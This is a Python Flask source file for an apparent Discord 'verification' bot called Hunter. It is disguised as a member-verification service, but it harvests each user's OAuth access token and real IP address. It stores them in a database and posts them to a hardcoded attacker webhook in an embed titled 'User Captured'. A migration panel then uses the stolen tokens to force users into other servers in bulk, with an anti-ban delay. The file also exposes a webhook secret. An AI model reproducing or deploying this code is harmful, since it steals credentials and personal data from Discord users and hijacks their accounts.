import os
import time
import random
import requests
import psycopg2
from flask import Flask, request, redirect, render_template

app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- CONFIGURAÇÕES ---
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1450162997187182632")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL") 
REDIRECT_URI = "https://hunter-bot-verify.onrender.com/callback"

LOG_WEBHOOK = "https://discord.com/api/webhooks/1447353848493772901/IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1"
API_BASE = "https://discord.com/api/v10"

# --- BANCO DE DADOS (PostgreSQL) ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Cria a tabela se não existir
        cur.execute("""
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id VARCHAR(50) PRIMARY KEY,
                username VARCHAR(100),
                ip_address VARCHAR(50),
                access_token TEXT,
                guild_id VARCHAR(50),
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("✅ DB Conectado e Tabela Verificada.")
    except Exception as e:
        print(f"❌ Erro DB: {e}")

def save_user_to_db(user_id, username, ip, token, guild_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Upsert: Insere ou Atualiza se já existir
        query = """
            INSERT INTO verified_users (user_id, username, ip_address, access_token, guild_id)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE 
            SET ip_address = EXCLUDED.ip_address, 
                access_token = EXCLUDED.access_token,
                guild_id = EXCLUDED.guild_id,
                verified_at = CURRENT_TIMESTAMP;
        """
        cur.execute(query, (user_id, username, ip, token, guild_id))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"❌ Erro Save DB: {e}")

# --- FUNÇÕES DISCORD ---
def get_headers_bot():
    return {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

def send_log_to_webhook(user_data, access_token, ip_address, guild_id):
    embed = {
        "title": "✅ Usuário Capturado!",
        "description": "Dados salvos no PostgreSQL.",
        "color": 0x00ff41,
        "fields": [
            { "name": "👤 User", "value": f"{user_data['username']} ({user_data['id']})", "inline": False },
            { "name": "🌍 IP", "value": f"`{ip_address}`", "inline": True },
            { "name": "🏰 Server ID", "value": f"`{guild_id}`", "inline": True },
            { "name": "🔑 Token", "value": f"||{access_token}||", "inline": False }
        ],
        "footer": { "text": "Hunter Database System" }
    }
    try:
        requests.post(LOG_WEBHOOK, json={"embeds": [embed], "username": "Hunter Logs"})
    except:
        pass

def get_or_create_verified_role(target_guild_id):
    url = f"{API_BASE}/guilds/{target_guild_id}/roles"
    response = requests.get(url, headers=get_headers_bot())
    if response.status_code == 200:
        for role in response.json():
            if role['name'] == "Vereficado": return role['id']
    
    # Criar cargo se não existir
    create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
    data = {"name": "Vereficado", "permissions": "0", "color": 0x00ff00, "hoist": False, "mentionable": False}
    create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
    if create_res.status_code in [200, 201]: return create_res.json()['id']
    return None

def join_user_to_guild(user_id, access_token, target_guild_id):
    url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}"
    data = {"access_token": access_token}
    r = requests.put(url, headers=get_headers_bot(), json=data)
    return r.status_code

def add_role_to_user(user_id, role_id, target_guild_id):
    url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}/roles/{role_id}"
    requests.put(url, headers=get_headers_bot())

# Inicializa o Banco ao ligar
init_db()

# --- ROTAS ---

@app.route('/')
def index():
    return "Hunter System Online."

@app.route('/ping')
def ping():
    return "Pong", 200

@app.route('/auth')
def auth():
    target_guild_id = request.args.get('guild_id')
    if not target_guild_id:
        return "Erro: ID do servidor faltando no link."
    
    # Gera o link do Discord
    oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join+guilds&state={target_guild_id}"
    
    # Renderiza o Launcher (para evitar bloqueio de popup e preparar o mobile)
    return render_template('launcher.html', url=oauth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    target_guild_id = request.args.get('state') 
    
    if not code: return "Erro: Código não recebido."

    # 1. Troca Código por Token
    data = {
        'client_id': CLIENT_ID, 
        'client_secret': CLIENT_SECRET, 
        'grant_type': 'authorization_code', 
        'code': code, 
        'redirect_uri': REDIRECT_URI
    }
    token_resp = requests.post(f'{API_BASE}/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    
    if token_resp.status_code != 200:
        return f"Erro ao obter token: {token_resp.text}"
    
    tokens = token_resp.json()
    access_token = tokens.get('access_token')
    
    # 2. Pega Dados do Usuário
    user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
    user_data = user_resp.json()
    user_id = user_data['id']
    username = user_data['username']

    # 3. Pega IP Real
    ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
    
    # 4. Salva no Banco e Manda Log
    save_user_to_db(user_id, username, ip, access_token, target_guild_id)
    send_log_to_webhook(user_data, access_token, ip, target_guild_id)

    # 5. Adiciona ao Servidor e Dá Cargo
    join_user_to_guild(user_id, access_token, target_guild_id)
    try:
        role_id = get_or_create_verified_role(target_guild_id)
        if role_id:
            add_role_to_user(user_id, role_id, target_guild_id)
    except Exception as e:
        print(f"Erro ao dar cargo: {e}")

    # 6. Renderiza a página de Sucesso com Deep Link (App Redirect)
    return render_template('success.html', guild_id=target_guild_id)

# --- PAINEL DE ENVIO (Manda o Embed pro Discord) ---
@app.route('/painel', methods=['GET', 'POST'])
def painel():
    message = ""
    if request.method == 'POST':
        target_guild_id = request.form.get('guild_id') 
        channel_id = request.form.get('channel_id')
        title = request.form.get('title')
        desc = request.form.get('desc')
        image_url = request.form.get('image_url')
        
        # O link do botão leva para o /auth com o ID do servidor
        verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"

        payload = {
            "embeds": [{
                "title": title, "description": desc, "color": 0x00ff41,
                "image": {"url": image_url} if image_url else {}
            }],
            "components": [{
                "type": 1,
                "components": [{
                    "type": 2, "style": 5, "label": "VERIFICAR AGORA", "url": verify_link
                }]
            }]
        }
        
        post_url = f"{API_BASE}/channels/{channel_id}/messages"
        r = requests.post(post_url, headers=get_headers_bot(), json=payload)
        
        if r.status_code == 200:
            message = "✅ Painel enviado com sucesso!"
        else:
            message = f"❌ Erro ({r.status_code}): {r.text}"

    return render_template('painel.html', message=message)

# --- PAINEL DE MIGRAÇÃO (Move membros entre servidores) ---
@app.route('/migrate', methods=['GET', 'POST'])
def migrate():
    log_msg = []
    
    if request.method == 'POST':
        action_type = request.form.get('action_type')
        target_guild_id = request.form.get('target_guild_id')
        
        conn = get_db_connection()
        cur = conn.cursor()

        try:
            # Migração Única
            if action_type == 'single':
                identifier = request.form.get('identifier')
                # Busca por ID ou Username
                cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s OR username = %s", (identifier, identifier))
                user = cur.fetchone()

                if user:
                    uid, uname, token = user
                    status = join_user_to_guild(uid, token, target_guild_id)
                    res_txt = "Sucesso" if status in [201, 204] else f"Falha ({status})"
                    log_msg.append(f"[{res_txt}] {uname}")
                else:
                    log_msg.append(f"⚠️ Usuário '{identifier}' não encontrado.")

            # Migração em Massa
            elif action_type == 'mass':
                amount = int(request.form.get('amount'))
                # Seleciona aleatórios
                cur.execute("SELECT user_id, username, access_token FROM verified_users ORDER BY RANDOM() LIMIT %s", (amount,))
                users = cur.fetchall()
                
                count = 0
                for user in users:
                    uid, uname, token = user
                    status = join_user_to_guild(uid, token, target_guild_id)
                    if status in [201, 204]: count += 1
                    time.sleep(0.5) # Delay anti-ban

                log_msg.append(f"🚀 Migração Finalizada: {count}/{len(users)} sucessos.")

        except Exception as e:
            log_msg.append(f"Erro Crítico: {str(e)}")
        finally:
            if conn: conn.close()

    return render_template('migration.html', logs=log_msg)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
